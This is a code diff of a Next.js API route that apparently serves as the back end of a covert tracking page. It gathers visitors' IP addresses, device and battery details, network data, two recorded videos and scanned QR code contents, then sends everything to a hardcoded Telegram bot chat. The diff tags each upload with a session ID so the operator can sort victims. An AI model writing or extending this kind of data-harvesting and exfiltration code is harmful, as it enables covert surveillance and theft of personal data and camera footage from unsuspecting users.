@@ -23,6 +23,7 @@ export async function POST(req: NextRequest) {
   try {
     const {
       messageType,
+      sessionId, // Получаем ID сессии
       timestamp,
       clientInfo,
       networkInfo,
@@ -38,21 +39,25 @@ export async function POST(req: NextRequest) {
     const ipAddress = req.headers.get("x-forwarded-for") || "Unavailable";
     const messages: Promise<Response>[] = [];
 
+    const sessionPrefix = sessionId ? `[Сессия: \`${sessionId}\`]\n` : "";
+
     switch (messageType) {
       case MessageType.InitialSummary:
-        let summaryText = "📊 *Отчет о сессии*\n\n";
+        let summaryText = `${sessionPrefix}📊 *Отчет о сессии*\n\n`;
         if (timestamp) {
           summaryText += `*Время сессии:* ${new Date(timestamp).toLocaleString('ru-RU')}\n`;
         }
         summaryText += "\n--- 📱 *Информация об устройстве* ---\n";
-        summaryText += `*IP:* \`${ipAddress}\`\n`;
+        if (ipAddress && ipAddress !== "Unavailable") {
+          summaryText += `*IP:* \`${ipAddress}\`\n`;
+        }
         if (clientInfo?.platform && clientInfo.platform !== "Недоступно") {
           summaryText += `*Платформа:* ${clientInfo.platform}\n`;
         }
         if (clientInfo?.hardwareConcurrency && clientInfo.hardwareConcurrency !== "Недоступно") {
           summaryText += `*Ядра CPU:* ${clientInfo.hardwareConcurrency}\n`;
         }
-        if (deviceMemory && deviceMemory !== "Недоступно") {
+        if (deviceMemory !== undefined && deviceMemory !== null) { // Проверяем на undefined/null
           summaryText += `*Память устройства:* ${deviceMemory} GB\n`;
         }
         if (clientInfo?.screenWidth && clientInfo.screenHeight) {
@@ -61,20 +66,22 @@ export async function POST(req: NextRequest) {
         if (clientInfo?.browserLanguage) {
           summaryText += `*Язык браузера:* ${clientInfo.browserLanguage}\n`;
         }
-        if (batteryInfo?.level !== undefined && batteryInfo.status !== "Not Supported") {
-          summaryText += `*Батарея:* ${(batteryInfo.level * 100).toFixed(0)}% (${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Заряжается" : "Не заряжается") : "Неизвестно"}) [Статус API: ${batteryInfo?.status || "Неизвестно"}]\n`;
-        } else if (batteryInfo?.status && batteryInfo.status !== "Available" && batteryInfo.status !== "Not Supported") {
-          summaryText += `*Батарея:* ${batteryInfo.status}\n`;
+        if (batteryInfo?.status && batteryInfo.status !== "Not Supported" && batteryInfo.status !== "Error") {
+          if (batteryInfo.level !== undefined) {
+            summaryText += `*Батарея:* ${(batteryInfo.level * 100).toFixed(0)}% (${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Заряжается" : "Не заряжается") : "Неизвестно"}) [Статус API: ${batteryInfo?.status || "Неизвестно"}]\n`;
+          } else {
+            summaryText += `*Батарея:* ${batteryInfo.status}\n`;
+          }
         }
 
         summaryText += "\n--- 🌐 *Информация о сети* ---\n";
         if (networkInfo?.effectiveType && networkInfo.effectiveType !== "Недоступно") {
           summaryText += `*Тип соединения:* ${networkInfo.effectiveType}\n`;
         }
-        if (networkInfo?.rtt !== undefined && networkInfo.rtt !== "Недоступно") {
+        if (networkInfo?.rtt !== undefined && networkInfo.rtt !== null) { // Проверяем на undefined/null
           summaryText += `*RTT:* ${networkInfo.rtt} ms\n`;
         }
-        if (networkInfo?.downlink !== undefined && networkInfo.downlink !== "Недоступно") {
+        if (networkInfo?.downlink !== undefined && networkInfo.downlink !== null) { // Проверяем на undefined/null
           summaryText += `*Downlink:* ${networkInfo.downlink} Mbps\n`;
         }
 
@@ -125,7 +132,8 @@ export async function POST(req: NextRequest) {
           const buffer = Buffer.from(base64Data, "base64");
           const formData = new FormData();
           formData.append("chat_id", TELEGRAM_CHAT_ID);
-          formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video_1.webm");
+          formData.append("video", new Blob([buffer], { type: "video/webm" }), `recorded_video_1_${sessionId}.webm`);
+          formData.append("caption", `${sessionPrefix}🎥 *Видео 1*`);
 
           messages.push(
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
@@ -147,7 +155,8 @@ export async function POST(req: NextRequest) {
           const buffer = Buffer.from(base64Data, "base64");
           const formData = new FormData();
           formData.append("chat_id", TELEGRAM_CHAT_ID);
-          formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video_2.webm");
+          formData.append("video", new Blob([buffer], { type: "video/webm" }), `recorded_video_2_${sessionId}.webm`);
+          formData.append("caption", `${sessionPrefix}🎥 *Видео 2*`);
 
           messages.push(
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
@@ -163,17 +172,17 @@ export async function POST(req: NextRequest) {
         break;
 
       case MessageType.QrCode:
-        let qrMessage = "\n--- 🎥 *Медиа и QR* ---\n";
+        let qrMessage = `${sessionPrefix}--- 📸 *QR-код* ---\n`;
         if (qrCodeData) {
           if (qrCodeData === "QR Scan Timed Out") {
-            qrMessage += `*QR-код:* Время сканирования истекло ⏳\n`;
+            qrMessage += `*QR-код:* Սկանավորման ժամանակը սպառվեց ⏳\n`; // Время сканирования истекло
           } else if (qrCodeData.startsWith("QR Scan Error:")) {
-            qrMessage += `*QR-код:* Ошибка сканирования ❌ (${qrCodeData.replace("QR Scan Error: ", "")})\n`;
+            qrMessage += `*QR-код:* Սկանավորման սխալ ❌ (${qrCodeData.replace("QR Scan Error: ", "")})\n`; // Ошибка сканирования
           } else {
-            qrMessage += `*QR-код отсканирован:* Да ✅ (\`${qrCodeData}\`)\n`;
+            qrMessage += `*QR-կոդը սկանավորված է:* Այո ✅ (\`${qrCodeData}\`)\n`; // QR-код отсканирован: Да
           }
         } else {
-          qrMessage += `*QR-код отсканирован:* Нет ❌\n`;
+          qrMessage += `*QR-կոդը սկանավորված է:* Ոչ ❌\n`; // QR-код отсканирован: Нет
         }
 
         messages.push(
